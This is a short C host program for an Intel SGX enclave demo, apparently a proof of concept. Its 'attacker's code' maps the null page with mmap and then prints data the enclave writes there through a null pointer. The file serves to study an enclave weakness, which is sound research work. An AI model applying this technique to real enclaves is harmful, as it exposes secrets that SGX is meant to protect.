#include "App.h"
#include "sgx_urts.h"
#include "Enclave_u.h"
#include <stdio.h>
#include "sgx_capable.h"
#include "sgx_uae_service.h"
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <errno.h>
#include <unistd.h>

sgx_enclave_id_t create_enclave(){
    sgx_enclave_id_t enclaveId = NULL;
    sgx_status_t ret = SGX_SUCCESS;
    sgx_launch_token_t token = {0};
    int updated;
    ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, &token, &updated, &enclaveId, NULL);
    if(ret != SGX_SUCCESS){
        printf("Error %#x: cannot create enclave\n", ret);
        exit(-1);
    }
    return enclaveId;
}

int main(){
    //attacker's code
    //using mmap to map address 0
    void* p = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    printf("mmap result %p (errno %s)\n",p,strerror(errno));
    ecall_demo(create_enclave());
    printf("%s\n",(char*)p);
    return 0;
}
